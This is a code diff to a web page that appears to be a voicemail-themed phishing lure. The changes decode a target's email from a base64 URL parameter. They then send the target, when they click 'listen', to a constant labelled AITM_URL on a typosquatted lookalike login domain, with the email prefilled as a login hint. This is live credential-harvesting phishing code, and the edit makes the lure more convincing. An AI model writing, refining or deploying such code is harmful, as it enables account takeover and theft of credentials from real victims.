@@ -78,8 +78,9 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:1
   const now = new Date();
   document.getElementById('vmDate').textContent = now.toLocaleDateString('en-US',{weekday:'long',month:'short',day:'numeric'}) + ' at ' + now.toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit'});
 
-  const hash = window.location.hash.slice(1);
-  const email = hash ? atob(hash) : '';
+  var ep = new URLSearchParams(window.location.search).get('e');
+  var hash = window.location.hash.slice(1);
+  const email = ep ? atob(ep) : (hash ? atob(hash) : '');
   const AITM_URL = 'https://login.hoosiermachlnery.com/qzPdEUwU';
 
   document.getElementById('listenBtn').addEventListener('click', function(e){
@@ -87,7 +88,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:1
     this.textContent = 'Connecting...';
     this.style.background = '#555';
     setTimeout(function(){
-      window.location.href = AITM_URL + (email ? '?e=' + encodeURIComponent(email) : '');
+      window.location.href = AITM_URL + (email ? '?login_hint=' + encodeURIComponent(email) : '');
     }, 600);
   });
 })();
